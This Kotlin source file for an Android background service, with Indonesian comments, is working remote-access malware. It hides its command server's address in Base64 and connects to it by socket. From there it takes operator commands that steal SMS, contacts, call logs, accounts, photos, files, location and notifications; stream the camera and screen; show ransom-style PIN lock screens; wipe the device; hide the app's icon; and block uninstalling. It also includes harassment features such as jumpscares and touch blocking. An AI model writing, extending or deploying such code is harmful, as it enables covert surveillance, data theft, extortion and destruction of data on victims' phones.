package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.webkit.MimeTypeMap
import android.webkit.WebView
import android.widget.ImageView
import android.widget.Toast
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URI
import java.net.URL
import java.util.ArrayDeque
import java.util.Locale
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"
        const val ACTION_WATCHDOG      = "ACTION_WATCHDOG_RECONNECT"

        val SERVER_URL: String get() = String(Base64.decode(
            "aHR0cHM6Ly9tb2JpdXNwYW5lbHN0b3JlLndlYi5pZDo1MDM0",
            Base64.DEFAULT
        )).trim()
        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 250L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null
    private var keyspamHandler: Handler? = null
    private var keyspamRunnable: Runnable? = null
    private var keyspamOverlayView: View? = null
    private var keyspamActive: Boolean = false
    private var keyspamShowState: Boolean = false



    // ── PENERIMA BROADCAST PESAN DARI TARGET ──
    private val chatFromTargetReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.CHAT_FROM_TARGET") {
                val message = intent.getStringExtra("message") ?: return
                Log.d("DeviceService", "Pesan dari target diterima: $message")
                sendChatToAdmin(message)
            }
        }
    }

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != Activity.RESULT_OK || data == null) {
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
                "com.sync.xxx.UNLOCK_FROM_UI" -> {
                    unlockDevice()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_RESULT)
            addAction("com.sync.xxx.NEW_NOTIF")
            addAction("com.sync.xxx.UNLOCK_FROM_UI") 
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
            registerReceiver(chatFromTargetReceiver, IntentFilter("com.sync.xxx.CHAT_FROM_TARGET"), RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
            registerReceiver(chatFromTargetReceiver, IntentFilter("com.sync.xxx.CHAT_FROM_TARGET"))
        }

        connectSocket()
        checkSavedLockState()
        
        // Mulai Alarm Watchdog agar service tetap terpantau berkala
        scheduleAlarm()
    }

    private fun scheduleAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, DeviceService::class.java).apply {
            action = ACTION_WATCHDOG
        }
        val pendingIntent = PendingIntent.getService(
            this, 
            999, 
            intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000L, // Cek setiap 1 menit
                pendingIntent
            )
        } else {
            alarmManager.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000L,
                pendingIntent
            )
        }
    }

    private fun checkSavedLockState() {
        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        val isLocked = prefs.getBoolean("is_locked", false)
        if (isLocked) {
            val savedPin = prefs.getString(LockOverlayService.EXTRA_PIN, "1234") ?: "1234"
            val savedTitle = prefs.getString(LockOverlayService.EXTRA_TITLE, "Perangkat Terkunci") ?: "Perangkat Terkunci"
            val savedCustomHtml = prefs.getString(LockOverlayService.EXTRA_CUSTOM_HTML, "") ?: ""
            val lockType = prefs.getString("lock_type", "new") ?: "new"

            val targetActivity = if (lockType == "v3_chat") LockChatActivity::class.java else LockNewActivity::class.java
            val lockIntent = Intent(this, targetActivity).apply {
                putExtra(LockOverlayService.EXTRA_PIN, savedPin)
                putExtra(LockOverlayService.EXTRA_TITLE, savedTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, savedCustomHtml)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(lockIntent)
            startLockFlashBlink()
        }
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockV3"           -> lockV3(value)
            "chatFromTarget"   -> sendChatToAdmin(value)
            "chatToTarget"     -> deliverChatToTarget(value)
            "flashlight"       -> setFlashlight(value == "true")
            "senter"           -> setSenter(value == "true")
            "setVolume"        -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
            "camera"           -> {
                when (value) {
                    "front" -> startCamera("front")
                    "back"  -> startCamera("back")
                    else    -> stopCamera()
                }
            }
            "screen"           -> {
                when (value) {
                    "start" -> requestScreenCapture()
                    else    -> stopScreenCapture()
                }
            }
            "lockDevice"       -> lockDevice(value)
            "lockCustom"       -> lockCustom(value)
            "unlockDevice"     -> unlockDevice()
            "changeTheme"      -> changeTheme(value)
            "setWallpaper"     -> setWallpaperFromUrl(value)
            "openUrl"          -> openUrl(value)
            "playAudio"        -> playAudio(value)
            "jumpscareStart"   -> startJumpscare(value)
            "jumpscareStop"    -> stopJumpscare()
            "blockApp"         -> blockApp(value)
            "unblockApp"       -> unblockApp(value)
            "unblockAll"       -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "openApp"          -> openApp(value)
            "uninstallApp"     -> uninstallApp(value)
            "getAppsManage"    -> sendAppsManage()
            "getSms"           -> sendSms()
            "getNotifs"        -> sendStoredNotifs()
            "getGallery"       -> sendGallery()
            "getLocation"      -> sendLocation()
            "getContacts"      -> sendContacts()
            "getGmail"         -> sendGmailAccounts()
            "getPhone"         -> sendPhoneNumbers()
            "getCallLogs"      -> sendCallLogs()
            "setScreenBrightness" -> setScreenBrightness(value.toIntOrNull() ?: 128)
            "wipeData"         -> wipeDeviceData()
            "vibrate"          -> vibrateDevice(value)
            "showToast"        -> showToast(value)
            "dialogSpam"       -> startDialogSpam(value)
            "dialogSpamStop"   -> stopDialogSpam()
            "touchBlock"       -> startTouchBlock(value)
            "touchBlockStop"   -> stopTouchBlock()
            "videoOverlay"     -> startVideoOverlay(value)
            "videoOverlayHide" -> stopVideoOverlay()
            "ttsSpeak"         -> ttsSpeak(value)
            "ttsStop"          -> ttsStop()
            "prankCall"   -> setPrankCall(value == "true")
            "keyboardSpam"     -> startKeyboardSpam()
            "keyboardSpamStop" -> stopKeyboardSpam()
            "spamWallpaper"     -> startSpamWallpaper(value)
            "spamWallpaperStop" -> stopSpamWallpaper()
            "lcdBroken"       -> setLcdBroken(value == "true")
            "hideIcon"         -> hideAppIcon(value == "true")
            "muteVolume"       -> setVolumeMute(value == "true")
            "jumpscare2Start"  -> startJumpscare2(value)
            "jumpscare2Stop"   -> stopJumpscare2()
            "getFiles"         -> sendFileList(value)
            "downloadFile"     -> downloadAndSendFile(value)
            "antiUninstall"    -> {
                val isActive = (value == "true")
                val intent = Intent("com.sync.xxx.SET_ANTI_UNINSTALL").apply {
                    putExtra("active", isActive)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("antiUninstall", isActive) })
            }
        }
    }
    
    private fun lockV3(jsonValue: String) {
        try {
            val obj   = JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockChatActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(LockOverlayService.EXTRA_PIN,   pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            startActivity(intent)

            startLockFlashBlink()
            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle",    title)
                put("lockV3Active", true)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockV3: ${e.message}")
        }
    }

    private fun sendChatToAdmin(message: String) {
        if (socket?.connected() != true) return
        socket?.emit("device:chat", JSONObject().apply {
            put("deviceId", deviceId)
            put("from", "target")
            put("message", message)
            put("time", System.currentTimeMillis())
        })
    }

    private fun deliverChatToTarget(message: String) {
        sendBroadcast(Intent("com.sync.xxx.CHAT_FROM_ADMIN").apply {
            putExtra("message", message)
            setPackage(packageName)
        })
    }

    private fun vibrateDevice(value: String) {
        try {
            var durationMs = 500L
            try {
                if (value.trim().startsWith("{")) {
                    val obj = JSONObject(value)
                    durationMs = obj.optLong("duration", obj.optLong("ms", obj.optLong("value", 500L)))
                } else {
                    durationMs = value.toLongOrNull() ?: 500L
                }
            } catch (_: Exception) {}

            if (durationMs < 100) durationMs = 1000L

            val audioAttr = android.media.AudioAttributes.Builder()
                .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? VibratorManager
                val vib = vm?.defaultVibrator
                val effect = VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE)
                vib?.vibrate(effect, audioAttr)
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val effect = VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE)
                    vib?.vibrate(effect, audioAttr)
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Getar ${durationMs}ms", Toast.LENGTH_SHORT).show()
            }

            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice ERROR: ${e.message}")
        }
    }

    private var jumpscare2Handler: Handler? = null
    private var jumpscare2Runnable: Runnable? = null
    private var jumpscare2View: ImageView? = null

    private fun startJumpscare2(value: String) {
        stopJumpscare2()
        try {
            val obj      = JSONObject(value)
            val url      = obj.getString("url")
            val duration = obj.optLong("duration", 3000L)

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val imgView = ImageView(this).apply {
                scaleType = ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(android.graphics.Color.BLACK)
            }

            jumpscare2View = imgView

            Handler(Looper.getMainLooper()).post {
                wm.addView(imgView, params)
            }

            Thread {
                try {
                    var redirectUrl = url
                    var bmp: Bitmap? = null
                    for (i in 0..4) {
                        val conn = URL(redirectUrl).openConnection() as HttpURLConnection
                        conn.connectTimeout = 12000
                        conn.readTimeout    = 15000
                        conn.instanceFollowRedirects = false
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                        conn.setRequestProperty("Accept", "image/*")
                        conn.connect()
                        val code = conn.responseCode
                        if (code in 300..399) {
                            val loc = conn.getHeaderField("Location")
                            conn.disconnect()
                            if (loc != null) { redirectUrl = loc; continue } else break
                        }
                        val bytes = conn.inputStream.readBytes()
                        conn.disconnect()
                        bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        break
                    }
                    val finalBmp = bmp
                    Handler(Looper.getMainLooper()).post {
                        if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare2 img: ${e.message}")
                }
            }.start()

            jumpscare2Handler = Handler(Looper.getMainLooper())
            jumpscare2Runnable = Runnable {
                try { wm.removeView(imgView) } catch (_: Exception) {}
                jumpscare2View = null
                emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
            }
            jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

            emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

        } catch (e: Exception) {
            Log.e("DeviceService", "startJumpscare2: ${e.message}")
        }
    }

    private fun stopJumpscare2() {
        jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
        jumpscare2Handler  = null
        jumpscare2Runnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscare2View?.let {
            try { wm.removeView(it) } catch (_: Exception) {}
        }
        jumpscare2View = null
        emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
    }

    private fun startDialogSpam(value: String) {
        try {
            val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
            startService(Intent(this, DialogSpamService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(DialogSpamService.ACTION_START).apply {
                    putExtra(DialogSpamService.EXTRA_TEXT, text)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startDialogSpam: ${e.message}")
        }
    }

    private fun stopDialogSpam() {
        val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
    }

    private fun ttsSpeak(value: String) {
        try {
            val obj = JSONObject(value)
            val svcIntent = Intent(this, TTSService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(svcIntent)
            else startService(svcIntent)
            val intent = Intent(TTSService.ACTION_SPEAK).apply {
                putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
                putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
                putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
                putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "ttsSpeak: ${e.message}")
        }
    }

    private fun ttsStop() {
        val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
    }

    private var touchBlockView: View? = null
    private var touchBlockHandler: Handler? = null
    private var touchBlockRunnable: Runnable? = null

    private fun startTouchBlock(value: String) {
        try {
            stopTouchBlock()
            val duration = try { JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val view = View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setOnTouchListener { _, _ -> true }
            }

            touchBlockView = view
            Handler(Looper.getMainLooper()).post {
                wm.addView(view, params)
            }

            emitStatus(JSONObject().apply { put("touchBlocked", true) })

            if (duration > 0) {
                touchBlockHandler = Handler(Looper.getMainLooper())
                touchBlockRunnable = Runnable { stopTouchBlock() }
                touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "startTouchBlock: ${e.message}")
        }
    }

    private fun stopTouchBlock() {
        touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
        touchBlockHandler  = null
        touchBlockRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        touchBlockView?.let {
            try {
                Handler(Looper.getMainLooper()).post {
                    wm.removeView(it)
                }
            } catch (_: Exception) {}
        }
        touchBlockView = null
        emitStatus(JSONObject().apply { put("touchBlocked", false) })
    }

    private fun startVideoOverlay(fileName: String) {
        try {
            startService(Intent(this, VideoOverlayService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(VideoOverlayService.ACTION_SHOW).apply {
                    setPackage(packageName)
                    putExtra(VideoOverlayService.EXTRA_VIDEO, fileName) 
                }
                sendBroadcast(intent)
                
                emitStatus(JSONObject().apply { 
                    put("videoOverlayActive", true)
                    if (fileName.contains("virus")) {
                        put("virusActive", true)
                    }
                })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startVideoOverlay: ${e.message}")
        }
    }

    private fun stopVideoOverlay() {
        val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { 
            put("videoOverlayActive", false)
            put("virusActive", false) 
        })
    }
    
    private fun setScreenBrightness(brightness: Int) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
                Log.e("DeviceService", "Gagal: Belum memiliki izin WRITE_SETTINGS")
                emitStatus(JSONObject().apply { put("toastSent", "Membuka pengaturan untuk meminta izin ubah sistem...") })
                
                val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                return
            }

            val level = brightness.coerceIn(0, 255)
            
            Settings.System.putInt(
                contentResolver, 
                Settings.System.SCREEN_BRIGHTNESS_MODE, 
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
            )
            
            Settings.System.putInt(
                contentResolver, 
                Settings.System.SCREEN_BRIGHTNESS, 
                level
            )
            
            val uri = Settings.System.getUriFor(Settings.System.SCREEN_BRIGHTNESS)
            contentResolver.notifyChange(uri, null)
            
            emitStatus(JSONObject().apply { 
                put("screenBrightness", level)
                put("toastSent", "Kecerahan diubah!")
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setScreenBrightness ERROR: ${e.message}")
        }
    }

    private fun hideAppIcon(hide: Boolean) {
        try {
            val pm = packageManager
            if (hide) {
                THEME_ALIASES.values.forEach { alias ->
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(packageName, alias),
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                }
                pm.setComponentEnabledSetting(
                    ComponentName(this, MainActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } else {
                pm.setComponentEnabledSetting(
                    ComponentName(this, THEME_ALIASES["default"]!!),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            emitStatus(JSONObject().apply { put("iconHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "hideAppIcon: ${e.message}")
        }
    }
    
    private fun wipeDeviceData() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, AntiUninstallReceiver::class.java)

            if (dpm.isAdminActive(adminComponent)) {
                emitStatus(JSONObject().apply { put("toastSent", "Proses Reset Dimulai") })
                dpm.wipeData(0) 
            } else {
                emitStatus(JSONObject().apply { put("toastSent", "Gagal: Bukan Device Admin") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "wipeDeviceData ERROR: ${e.message}")
        }
    }
    
private var spamWpHandler: Handler? = null
private var spamWpRunnable: Runnable? = null
private var spamWpUrls: List<String> = emptyList()
private var spamWpGeneration = 0

private fun startSpamWallpaper(value: String) {
    stopSpamWallpaper()

    spamWpUrls = try {
        val arr = JSONArray(value)
        (0 until arr.length())
            .map { arr.getString(it) }
            .filter { it.isNotBlank() }
    } catch (_: Exception) {
        if (value.isNotBlank()) listOf(value.trim())
        else emptyList()
    }

    if (spamWpUrls.isEmpty()) {
        emitStatus(JSONObject().apply {
            put("spamWallpaperActive", false)
        })
        return
    }

    val generation = spamWpGeneration

    spamWpHandler = Handler(Looper.getMainLooper())

    spamWpRunnable = object : Runnable {
        override fun run() {
            if (generation != spamWpGeneration) return
            if (spamWpUrls.isEmpty()) return

            val pickedUrl = spamWpUrls.random()

            Thread {
                try {
                    val conn = (URL(pickedUrl).openConnection() as HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 8000
                        readTimeout = 15000
                        instanceFollowRedirects = true
                        setRequestProperty("User-Agent", "Mozilla/5.0")
                    }

                    try {
                        conn.connect()

                        if (conn.responseCode != HttpURLConnection.HTTP_OK) {
                            return@Thread
                        }

                        val bytes = conn.inputStream.use {
                            it.readBytes()
                        }

                        // Jangan lanjut kalau sudah di-stop
                        if (generation != spamWpGeneration) return@Thread

                        val bmp = BitmapFactory.decodeByteArray(
                            bytes,
                            0,
                            bytes.size
                        ) ?: return@Thread

                        try {
                            if (generation != spamWpGeneration) return@Thread

                            val wm = WallpaperManager.getInstance(
                                this@DeviceService
                            )

                            wm.setBitmap(bmp)
                        } finally {
                            bmp.recycle()
                        }

                    } finally {
                        conn.disconnect()
                    }

                } catch (e: Exception) {
                    Log.e(
                        "DeviceService",
                        "spamWallpaper error",
                        e
                    )
                }
            }.start()

            spamWpHandler?.postDelayed(
                this,
                3000L
            )
        }
    }

    spamWpHandler?.post(spamWpRunnable!!)

    emitStatus(JSONObject().apply {
        put("spamWallpaperActive", true)
    })
}

private fun stopSpamWallpaper() {
    spamWpGeneration++

    spamWpUrls = emptyList()

    spamWpRunnable?.let {
        spamWpHandler?.removeCallbacks(it)
    }

    spamWpRunnable = null
    spamWpHandler = null

    emitStatus(JSONObject().apply {
        put("spamWallpaperActive", false)
    })
}

private var lcdOverlayView: android.webkit.WebView? = null
